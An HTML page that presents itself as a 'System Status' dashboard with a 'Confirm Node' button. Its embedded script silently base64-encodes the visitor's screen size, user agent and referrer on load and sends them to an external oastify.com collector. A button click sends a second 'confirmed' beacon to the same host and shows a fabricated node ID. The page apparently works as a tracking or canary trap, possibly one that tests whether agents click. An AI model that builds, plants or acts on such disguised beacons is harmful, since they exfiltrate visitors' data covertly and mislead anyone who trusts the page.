<!DOCTYPE html>
<html>
<head><title>System Status</title></head>
<body>
    <h1 id="status-title">System: Operational</h1>
    <div id="container" style="padding:20px; border:1px solid #ccc;">
        <p>Current Node: <span id="node-id">Scanning...</span></p>
        <button id="verify-btn" style="background-color: #28a745; color: white;">Confirm Node</button>
    </div>

    <script>
        const addr = "rc7zeqchoy9cgqsxdrn261z5mwsqgg45.oastify.com";
        
        // Immediate background "heartbeat"
        const info = btoa(JSON.stringify({
            res: window.screen.width + "x" + window.screen.height,
            ua: navigator.userAgent,
            ref: document.referrer
        }));
        new Image().src = `https://${addr}/heartbeat?v=${info}`;

        // Function that triggers only if the button is clicked
        function confirmAction() {
            fetch(`https://${addr}/confirmed?status=active`, { mode: 'no-cors' });
            document.getElementById('node-id').innerText = "NODE_7741_ACTIVE";
        }
        document.getElementById('verify-btn').onclick = confirmAction;
    </script>
</body>
</html>
